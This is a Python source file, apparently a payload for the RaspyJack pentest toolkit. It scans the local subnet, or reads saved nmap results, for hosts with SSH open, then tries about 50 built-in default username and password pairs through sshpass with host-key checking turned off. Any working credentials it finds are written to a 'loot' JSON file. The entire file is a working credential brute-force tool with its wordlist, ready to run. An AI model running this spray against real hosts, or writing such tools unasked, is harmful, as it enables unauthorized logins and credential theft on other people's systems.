#!/usr/bin/env python3
# @name: SSH Credential Spray
# @desc: Auto-discovers SSH hosts from nmap loot or quick port-22 scan on the local subnet, then sprays ~50 common user:pass pairs using sshpass.
# @category: credentials
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- SSH Credential Spray
==========================================
Author: 7h30th3r0n3

Auto-discovers SSH hosts from nmap loot or quick port-22 scan on the
local subnet, then sprays ~50 common user:pass pairs using sshpass.

Setup / Prerequisites:
  - Requires sshpass: apt install sshpass
  - Built-in wordlist included (no external files needed).

Controls:
  python3 ssh_bruteforce.py [target_host]

  target_host  -- optional. If omitted, hosts are discovered from this
                  engagement's loot and a quick port-22 scan of the local
                  subnet; each candidate is labeled with where it came
                  from and the operator picks one with a real select
                  prompt. If given, brute-forcing starts immediately
                  against that host (no discovery scan is run).

  Results are printed as they are found and exported to loot when the
  run finishes (or is interrupted with Ctrl-C).

Loot: <CITYPOP_LOOT>/SSH/ssh_creds_YYYYMMDD_HHMMSS.json
"""

from payloads._web_input import request_input
import os
import sys
import json
import time
import socket
import threading
import subprocess
import ipaddress
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

LOOT_DIR = os.path.join(os.environ.get("CITYPOP_LOOT", "/tmp/citypop_loot"), "SSH")
NMAP_LOOT = os.environ.get("CITYPOP_LOOT", "/tmp/citypop_loot")
RATE_LIMIT = 1.0

# ---------------------------------------------------------------------------
# Built-in wordlist (~50 common SSH user:pass pairs)
# ---------------------------------------------------------------------------
WORDLIST = [
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("root", "1234"), ("root", "12345"), ("root", "123456"),
    ("root", ""), ("root", "changeme"), ("root", "letmein"),
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", "12345"), ("admin", "123456"), ("admin", ""),
    ("admin", "changeme"), ("admin", "admin123"), ("admin", "default"),
    ("user", "user"), ("user", "password"), ("user", "1234"),
    ("pi", "raspberry"), ("pi", "raspberrypi"), ("pi", "password"),
    ("ubuntu", "ubuntu"), ("debian", "debian"), ("test", "test"),
    ("test", "password"), ("guest", "guest"), ("guest", "password"),
    ("oracle", "oracle"), ("postgres", "postgres"), ("mysql", "mysql"),
    ("ftpuser", "ftpuser"), ("nagios", "nagios"), ("tomcat", "tomcat"),
    ("ubnt", "ubnt"), ("support", "support"), ("operator", "operator"),
    ("cisco", "cisco"), ("service", "service"), ("monitor", "monitor"),
    ("backup", "backup"), ("www-data", "www-data"), ("nobody", "nobody"),
    ("ansible", "ansible"), ("vagrant", "vagrant"), ("deploy", "deploy"),
    ("jenkins", "jenkins"), ("git", "git"),
]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = True

found_creds = []    # [{"host", "user", "pass"}]
attempts_done = 0
attempts_total = 0


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _detect_subnet():
    """Return the local subnet CIDR."""
    for iface in ("eth0", "wlan0"):
        try:
            res = subprocess.run(
                ["ip", "-4", "addr", "show", iface],
                capture_output=True, text=True, timeout=5,
            )
            for line in res.stdout.splitlines():
                stripped = line.strip()
                if stripped.startswith("inet "):
                    return stripped.split()[1]
        except Exception:
            pass
    return None


def _load_nmap_ssh_hosts():
    """Find SSH hosts (port 22 open) from nmap-shaped JSON already saved in
    this engagement's loot. Returns host -> sorted list of relative file
    paths. This payload's own output directory is excluded so a previous
    export can't be rediscovered as a "new" host.
    """
    found: dict[str, set[str]] = {}
    if not os.path.isdir(NMAP_LOOT):
        return {}

    own_output = os.path.realpath(LOOT_DIR)
    for dirpath, dirs, files in os.walk(NMAP_LOOT):
        if os.path.realpath(dirpath) == own_output:
            dirs[:] = []
            continue
        for fname in files:
            if not fname.endswith(".json"):
                continue
            fpath = os.path.join(dirpath, fname)
            try:
                with open(fpath, "r") as fh:
                    data = json.load(fh)
            except Exception:
                continue
            hosts: set[str] = set()
            _extract_ssh_from_nmap(data, hosts)
            if not hosts:
                continue
            relative = os.path.relpath(fpath, NMAP_LOOT)
            for host in hosts:
                found.setdefault(host, set()).add(relative)

    return {host: sorted(paths) for host, paths in found.items()}


def _extract_ssh_from_nmap(data, ssh_hosts):
    """Recursively search nmap JSON for port 22 open entries."""
    if isinstance(data, dict):
        port = data.get("port", data.get("portid"))
        state = data.get("state", "")
        if str(port) == "22" and "open" in str(state).lower():
            ip = data.get("ip", data.get("addr", data.get("host", "")))
            if ip:
                ssh_hosts.add(str(ip))
        for val in data.values():
            _extract_ssh_from_nmap(val, ssh_hosts)
    elif isinstance(data, list):
        for item in data:
            _extract_ssh_from_nmap(item, ssh_hosts)


def _scan_ssh_hosts(cidr):
    """Quick TCP connect scan for port 22 on a subnet."""
    found = []
    try:
        network = ipaddress.IPv4Network(cidr, strict=False)
    except ValueError:
        return found
    for host in network.hosts():
        if not running:
            break
        ip = str(host)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, 22))
            sock.close()
            if result == 0:
                found.append(ip)
        except Exception:
            pass
    return found


def _discover_hosts():
    """Discover SSH host candidates, each labeled with where it came from."""
    candidates = []

    def _add(host, source):
        for entry in candidates:
            if entry["host"] == host:
                if source not in entry["sources"]:
                    entry["sources"].append(source)
                return
        candidates.append({"host": host, "sources": [source]})

    nmap_hosts = _load_nmap_ssh_hosts()
    for host, files in nmap_hosts.items():
        for path in files:
            _add(host, f"engagement loot: {path}")
    if nmap_hosts:
        print(f"[*] Found {len(nmap_hosts)} SSH host(s) in engagement loot", flush=True)

    cidr = _detect_subnet()
    if cidr and running:
        print(f"[*] Scanning subnet {cidr} for port 22...", flush=True)
        scanned = _scan_ssh_hosts(cidr)
        for host in scanned:
            _add(host, f"live scan: port 22 open on {cidr}")

    candidates.sort(key=lambda entry: entry["host"])
    return candidates


def _prompt_host_selection(candidates):
    """Ask once with a real select prompt, or take manual entry.

    ``candidates`` is a list of {"host": ..., "sources": [...]} dicts so
    the dialog shows where each discovered host came from instead of a
    bare numbered list. Returns the chosen host string, or None.
    """
    choices = [
        {"value": entry["host"], "label": f"{entry['host']} — {'; '.join(entry['sources'])}"}
        for entry in candidates
    ]
    choices.append({"value": "manual", "label": "Enter a different host"})
    choices.append({"value": "cancel", "label": "Cancel"})

    try:
        answer = request_input(
            "Select a host to brute-force", input_type="select", choices=choices,
            default="cancel", required=True,
        )
    except EOFError:
        return None

    if answer in (None, "", "cancel"):
        return None
    if answer == "manual":
        try:
            manual = request_input("Enter a host to brute-force", required=False).strip()
        except EOFError:
            manual = ""
        return manual or None

    return answer


# ---------------------------------------------------------------------------
# Brute-force
# ---------------------------------------------------------------------------

def _try_ssh_login(host, user, password):
    """Attempt a single SSH login via sshpass. Returns True on success."""
    try:
        cmd = [
            "sshpass", "-p", password,
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=3",
            "-o", "BatchMode=no",
            f"{user}@{host}",
            "echo", "ok",
        ]
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=8,
        )
        return result.returncode == 0 and "ok" in result.stdout
    except Exception:
        return False


def _brute_force(target_host):
    """Brute-force a single host with the built-in wordlist."""
    global attempts_done, attempts_total

    with lock:
        attempts_done = 0
        attempts_total = len(WORDLIST)

    print(f"[*] Starting brute-force against {target_host} "
          f"({attempts_total} credential pairs)", flush=True)
    start_time = time.time()

    for idx, (user, passwd) in enumerate(WORDLIST):
        if not running:
            break

        with lock:
            attempts_done = idx + 1

        success = _try_ssh_login(target_host, user, passwd)

        if success:
            entry = {"host": target_host, "user": user, "pass": passwd}
            with lock:
                found_creds.append(entry)
            print(f"[+] FOUND: {user}:{passwd} @ {target_host}", flush=True)
        elif (idx + 1) % 10 == 0:
            elapsed = time.time() - start_time
            rate = (idx + 1) / max(elapsed, 0.01)
            print(f"[*] {idx + 1}/{attempts_total} attempts "
                  f"({rate:.1f}/s)", flush=True)

        time.sleep(RATE_LIMIT)

    if not any(c["host"] == target_host for c in found_creds):
        print(f"[*] No valid credentials found for {target_host}", flush=True)


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_loot():
    """Write found credentials to JSON loot file."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(LOOT_DIR, f"ssh_creds_{ts}.json")
    with lock:
        data = {
            "timestamp": ts,
            "credentials": list(found_creds),
        }
    with open(filepath, "w") as fh:
        json.dump(data, fh, indent=2)
    return filepath


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running

    if "-h" in sys.argv or "--help" in sys.argv:
        print("Usage: python3 ssh_bruteforce.py [target_host]", flush=True)
        return 0

    try:
        subprocess.run(["sshpass", "-V"], capture_output=True, timeout=3)
    except FileNotFoundError:
        print("[!] sshpass not found. Install with: apt install sshpass", flush=True)
        return 1
    except Exception:
        pass

    target = sys.argv[1] if len(sys.argv) > 1 else None

    try:
        if not target:
            hosts = _discover_hosts()
            if not hosts:
                print("[!] No SSH hosts discovered. Pass a target host as an "
                      "argument instead.", flush=True)
                return 1

            print(f"[*] Discovered {len(hosts)} SSH host(s):", flush=True)
            for entry in hosts:
                print(f"  - {entry['host']} ({'; '.join(entry['sources'])})", flush=True)

            target = _prompt_host_selection(hosts)
            if not target:
                print("[!] No host selected.", flush=True)
                return 1

        _brute_force(target)

    except KeyboardInterrupt:
        running = False
        print("\n[*] Interrupted.", flush=True)

    finally:
        running = False
        with lock:
            has_creds = len(found_creds) > 0
        if has_creds:
            path = _export_loot()
            print(f"[*] Exported {len(found_creds)} credential(s) to {path}", flush=True)
        else:
            print("[*] No credentials to export.", flush=True)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
